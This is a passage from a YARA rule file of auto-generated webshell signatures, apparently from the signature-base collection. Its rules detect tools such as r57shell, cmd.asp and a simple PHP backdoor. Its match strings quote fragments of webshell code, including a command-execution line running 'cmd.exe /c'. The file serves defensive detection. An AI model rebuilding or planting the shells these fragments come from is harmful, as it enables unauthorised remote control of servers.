		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7417-L7430"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		logic_hash = "396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"

	condition:
		all of them
}
rule SIGNATURE_BASE_Svchostdll {
    meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7431-L7450"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		logic_hash = "4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_Server {
    meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7451-L7462"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d38526a215df13c7373da4635541b43"
		logic_hash = "66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageServer Below -->"

	condition:
		all of them
}
rule SIGNATURE_BASE_Vanquish {
    meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7463-L7476"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "684450adde37a93e8bb362994efc898c"
		logic_hash = "223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"

	condition:
		all of them
}
rule SIGNATURE_BASE_Winshell {
    meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7477-L7496"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3144410a37dd4c29d004a814a294ea26"
		logic_hash = "addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Remview {
    meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7497-L7510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"

	condition:
		all of them
}
rule SIGNATURE_BASE_Saphpshell {
    meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7511-L7522"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		logic_hash = "24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006Z {
    meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7523-L7535"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		logic_hash = "4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"

	condition:
		all of them
}
rule SIGNATURE_BASE_Admin_Ad {
    meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7536-L7548"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		logic_hash = "0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Casus15 {
    meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7549-L7560"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
		logic_hash = "58921290952f23ff5b828d8c92c818ebd91b726cdbbc9137b0f55a0e5ca90636"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"

	condition:
		all of them
}
rule SIGNATURE_BASE_Shelltools_G0T_Root_Uptime {
    meta:
		description = "Webshells Auto-generated - file uptime.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4f649757-9502-5640-bc17-11cad6c779f4"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7578-L7593"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
		logic_hash = "5d91dda859a63a965250bd4d76565c6adf18e4ee306be3b91965e5d35bc521e8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "JDiamondCSlC~"
		$s1 = "CharactQA"
		$s2 = "$Info: This file is packed with the UPX executable packer $"
		$s5 = "HandlereateConso"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}
rule SIGNATURE_BASE_Simple_PHP_Backdoor {
    meta:
		description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "bd7c19b9-e035-5e70-b626-1d210cadc055"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7594-L7607"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a401132363eecc3a1040774bec9cb24f"
		logic_hash = "9739217c23f583452fbf1d7a8e20b2f1379ebf430e0a4fd73ad62e88d544670a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
		$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
		$s9 = "// a simple php backdoor"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Sig_2005Gray {
    meta:
		description = "Webshells Auto-generated - file 2005Gray.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "978fb04e-517d-51cf-98ca-5fd6b421365e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7608-L7622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "75dbe3d3b70a5678225d3e2d78b604cc"
		logic_hash = "927ed5cdaa14b6cd63a6ca7d7bec6635b69fa19d88808890e7d198fb7a0b57b4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
		$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
		$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"

	condition:
		all of them
}
rule SIGNATURE_BASE_Dllinjection {
    meta:
		description = "Webshells Auto-generated - file DllInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8a57e122-fd00-57f3-94db-736c5bfd76db"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7623-L7634"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a7b92283a5102886ab8aee2bc5c8d718"
		logic_hash = "6e01ae1cc8a91a5e0d22bdf477aa72bf0116dbe31752a069b1e34d8a09ec6213"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\BDoor\\DllInjecti"

	condition:
		all of them
}
rule SIGNATURE_BASE_Mithril_V1_45_Mithril {
    meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3c160017-0332-532a-bb7f-390a4a34dc4e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7635-L7647"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f1484f882dc381dde6eaa0b80ef64a07"
		logic_hash = "a3e74bfb34762553eccaddd745d9e17dc3a5a25201e4bc9e2ea9a49342295c78"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "cress.exe"
		$s7 = "\\Debug\\Mithril."

	condition:
		all of them
}
rule SIGNATURE_BASE_Hkshell_Hkrmv {
    meta:
		description = "Webshells Auto-generated - file hkrmv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "986fad12-9198-5e0a-88d6-a9be6963ff8c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7648-L7660"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bd3a0b7a6b5536f8d96f50956560e9bf"
		logic_hash = "f1da0778456272e6d93633a564018bdf0fa74f1db1c9e963a03a59c69c752b6e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "/THUMBPOSITION7"
		$s6 = "\\EvilBlade\\"

	condition:
		all of them
}
rule SIGNATURE_BASE_WEBSHELL_PHP_1 {
    meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d0107af3-e484-54cf-a238-dd1e71efd3f6"
		date = "2023-12-05"
		modified = "2023-12-05"
		old_rule_name = "phpshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7661-L7675"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1dccb1ea9f24ffbd085571c88585517b"
		logic_hash = "eed450ae6668bbee01ea2689e9864f10a66714ec4c91afabb12609ad4ebdac8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
		$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
		$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Cmd {
    meta:
		description = "Webshells Auto-generated - file cmd.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f7a74f21-aec9-5ee7-a80e-0fe34b977a71"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7676-L7688"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cbe8e365d41dd3cd8e462ca434cf385f"
		logic_hash = "43f3379a57210f0e3b70575313115a7ba3d71359de7c5ac9a6a178b93af3545e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
		$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Phpft {
    meta:
		description = "Webshells Auto-generated - file phpft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "00bc690b-4977-5076-a40a-edd39c37233f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7689-L7701"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "60ef80175fcc6a879ca57c54226646b1"
		logic_hash = "741536acafdc4da618d69bdae2f0a3e8c004a4027cc76c796158ee111c006414"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "PHP Files Thief"
		$s11 = "http://www.4ngel.net"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Indexer {
    meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "fba053d7-5413-563f-8c27-0554349500b2"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7702-L7713"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "a1bfba9c24819f5c1574aa179d853a6cc2fcf58c7b9a14eeab2639248178549c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r"

	condition:
		all of them
}
rule SIGNATURE_BASE_R57Shell {
    meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7714-L7725"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "40ff6bceb3f9bd95fbf5e75681fadadaa64243007e10fcc86bb909282b8161c5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"

	condition:
		all of them
}
rule SIGNATURE_BASE_Bdcli100 {
    meta:
		description = "Webshells Auto-generated - file bdcli100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c74e8822-9556-5596-a130-c6e0120d7103"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7726-L7738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b12163ac53789fb4f62e4f17a8c2e028"
		logic_hash = "48c70413c71d5a84f8cea48c77935b7cc26d9e1348d7ab257de4540d69f0f817"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "unable to connect to "
		$s8 = "backdoor is corrupted on "

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Devpack_2005Red {
    meta:
		description = "Webshells Auto-generated - file 2005Red.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7739-L7752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d8ccda2214b3f6eabd4502a050eb8fe8"
		logic_hash = "716b6faa8d1216f592d63b658cdd65d7be0226bf746b5fdf1827bdf881562711"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "scrollbar-darkshadow-color:#FF9DBB;"
		$s3 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
		$s9 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006X2 {
    meta:
		description = "Webshells Auto-generated - file 2006X2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7753-L7765"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cc5bf9fc56d404ebbc492855393d7620"
		logic_hash = "0df587ccaf41d11c6be90ef631ce8b21f95f08fa8f71e62463c378455b312f4a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Powered By "
		$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."

	condition:
		all of them
}
rule SIGNATURE_BASE_Rdrbs084 {
    meta:
		description = "Webshells Auto-generated - file rdrbs084.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97548273-6894-5c9f-8cca-d966ce770ada"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7766-L7778"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ed30327b255816bdd7590bf891aa0020"
		logic_hash = "8a743d62723c4a5f863f986edd4b149728680b40d6a4b9a99b093d62ccb70cf8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Create mapped port. You have to specify domain when using HTTP type."
		$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Caseswitch_2005 {
    meta:
		description = "Webshells Auto-generated - file 2005.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0f2b8e71-1c11-5efe-bee7-146168aec369"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7779-L7797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8bf667ee9e21366bc0bd3491cb614f41"
		logic_hash = "0ecf28b5abb918cd1d8f38b76019dddf19dff5dbb114f16ef6ec9b46cb590a46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "MSComDlg.CommonDialog"
		$s2 = "CommonDialog1"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s5 = "EVENT_SINK_AddRef"
		$s6 = "By Marcos"
		$s7 = "EVENT_SINK_QueryInterface"
		$s8 = "MethCallEngine"

	condition:
		all of them
}
rule SIGNATURE_BASE_Ebayid_Index3 {
    meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fc30150-7b44-53c4-888c-faf651495407"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L7798-L7809"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0412b1e37f41ea0d002e4ed11608905f"
		logic_hash = "47660cb71d6787683e51aa14fc0f4a9d6f1c59517b77bfe4135098a0020ded11"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Phvayv {
    meta:
